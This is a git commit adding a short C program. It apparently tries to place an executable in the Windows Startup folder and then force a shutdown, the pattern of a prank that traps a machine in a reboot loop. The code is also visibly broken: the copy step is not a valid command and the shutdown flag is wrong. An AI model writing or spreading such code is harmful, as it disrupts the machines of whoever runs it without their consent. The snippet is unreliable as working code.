5aff09221329fc30f1aa63f25546a924b9a9ed11
Shivam7-1 <55046031+Shivam7-1@users.noreply.github.com>
2020-06-29 11:55:10 +0530

    Create Code.c

---
+++ Code/Code.c
@@ -0,0 +1,9 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <dos.h>
+int main()
+{
+     system("resart.exe C:/Documents and Settings/All Users/Start Menu/Programs/Startup/");
+     system("shutdown -1 -f");
+    return 0;
+}
